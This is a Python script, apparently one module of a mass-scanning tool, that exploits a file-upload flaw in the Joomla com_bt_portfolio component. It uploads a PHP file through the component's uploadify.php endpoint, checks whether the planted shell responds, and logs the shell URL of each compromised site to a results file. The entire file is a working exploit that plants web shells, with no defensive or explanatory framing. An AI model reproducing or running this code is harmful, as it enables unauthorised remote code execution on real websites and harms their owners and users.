# coding=utf-8
import requests
import printModule

Headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'
}

def Exploit(site):
    try:
        PostFile = {
            'Filedata': open('files/up.php', 'rb')
        }
        requests.post('http://' + site + '/administrator/components/com_bt_portfolio/helpers/uploadify/uploadify.php',
                      files=PostFile, timeout=10, headers=Headers)
        CheckShell = requests.get('http://' + site + '/administrator/components/com_bt_portfolio/up.php',
                                  timeout=10, headers=Headers)
        if 'Vuln!!' in str(CheckShell.content):
            with open('result/Shell_results.txt', 'a') as writer:
                writer.write(site + '/administrator/components/com_bt_portfolio/up.php' + '\n')
            return printModule.returnYes(site, 'N/A', 'com_bt_portfolio', 'Joomla')
        else:
            return printModule.returnNo(site, 'N/A', 'com_bt_portfolio', 'Joomla')
    except:
        return printModule.returnNo(site, 'N/A', 'com_bt_portfolio', 'Joomla')
